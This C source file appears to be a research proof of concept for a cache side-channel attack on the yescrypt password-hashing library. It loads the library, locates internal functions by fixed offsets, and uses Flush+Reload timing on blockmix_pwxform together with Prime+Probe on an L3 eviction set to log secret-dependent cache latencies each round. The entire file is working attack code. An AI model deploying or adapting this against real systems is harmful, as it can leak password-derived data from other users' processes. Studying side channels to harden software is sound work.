#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include "constants.h"

#define REPEAT 20

void clflush(uint64_t addr)
{
    asm volatile ("clflush (%0)"::"r"(addr));
}

uint32_t measure_one_block_access_time(uint64_t addr)
{
	uint32_t cycles;

	asm volatile("mov %1, %%r8\n\t"
	"lfence\n\t"
	"rdtsc\n\t"
	"mov %%eax, %%edi\n\t"
	"mov (%%r8), %%r8\n\t"
	"lfence\n\t"
	"rdtsc\n\t"
	"sub %%edi, %%eax\n\t"
	: "=a"(cycles) /*output*/
	: "r"(addr)
	: "r8", "edi");	

	return cycles;
}

void wait_cycles(uint64_t cycles){
    uint64_t start, end;
    __asm__ volatile("lfence\n\t"
    "rdtsc\n\t"
    : "=a"(start));

    do {
        __asm__ volatile("lfence\n\t"
            "rdtsc\n\t"
            : "=a"(end));
    }while (end-start < cycles);
}

static inline void mfence() {
    asm volatile("mfence");
}

void get_eviction_set(void *buf, void **eviction_set, uint64_t set) {

    for (int i=0; i<L3_ASSOC; i++){
        eviction_set[i] = (void *) ((uint64_t)buf + (uint64_t)(i<<16) + (uint64_t)(set<<6));
    }
    
}

int main() {
    uint32_t t;
    void *handle_libyescrypt = dlopen("../libyescrypt-ref.so", RTLD_LAZY);
    void (*yescrypt_kdf)() = dlsym(handle_libyescrypt, "yescrypt_kdf");
    void (*blockmix_pwxform)() = yescrypt_kdf - 0x1610;
    void (*smix)() = yescrypt_kdf - 0xd80;
    printf("%p\n", yescrypt_kdf);
    printf("%p\n", blockmix_pwxform);
    //void (*pwxform)() = dlsym(handle_libyescrypt, "pwxform");
    void *eviction_set[L3_ASSOC];
    void *buf= mmap(NULL, L3_SIZE, PROT_READ | PROT_WRITE, 
        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, 
        -1, 0);
    char trash;
    get_eviction_set(buf, eviction_set, L3_CACHE_SET);

    int tmp[8000];
    uint32_t rounds[4096];
    uint32_t latencies[4096];
    do {
        t = measure_one_block_access_time((uint64_t) smix);
        clflush((uint64_t) smix);
        mfence();
        wait_cycles(500);
    } while (t > 100);
    int ticker=0;
    int c = 0;
    do{
        //ticker
        int iterations = 0;
        do {
            clflush((uint64_t) blockmix_pwxform + 0x23);
            mfence();
            wait_cycles(5000);
            t = measure_one_block_access_time((uint64_t) blockmix_pwxform + 0x23);
            iterations++;
        } while (iterations < 0 || t > 100 && iterations < 10000);
        if (iterations == 10000) {
            printf("\nlast t: %d\n", t);
            printf("itarations: %d\n", iterations);
            break;
            
        }
        tmp[ticker] = iterations;
        ticker++;
        
        uint32_t latency = 0;
        for (int k=0; k<REPEAT; k++) {
            for (int i=0; i<L3_ASSOC;i++) {
                trash =  *((char *)(eviction_set[i]));
            }
        }
        
        for (int i=L3_ASSOC-1; i>=0;i--) {
            latency += measure_one_block_access_time((uint64_t)(eviction_set[i]));
        }

        latency = latency/L3_ASSOC;
        if (latency > 50) {
            rounds[c] = ticker;
            latencies[c++] = latency;
        }

    } while (1);
    
    printf("\nticker: %d\n", ticker);
    for (int i=0; i<c; i++) printf("roud: %d\tlatency: %d\n", rounds[i], latencies[i]);

    
    return 0;
}
